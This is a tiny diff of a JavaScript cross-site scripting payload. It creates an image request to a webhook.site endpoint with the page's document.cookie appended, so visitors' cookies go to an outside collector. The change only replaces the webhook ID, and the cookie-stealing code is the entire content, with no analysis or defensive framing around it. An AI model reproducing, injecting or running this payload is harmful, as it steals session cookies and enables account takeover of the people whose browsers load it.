@@ -1,4 +1,4 @@
 var i = new Image();
 i.src =
-  "https://webhook.site/7f12c63b-da49-48ad-95d1-3e0ab815788a?" +
+  "https://webhook.site/9e6cf47b-73f4-4f31-b5a6-9ecdae2b7c83?" +
   document.cookie;
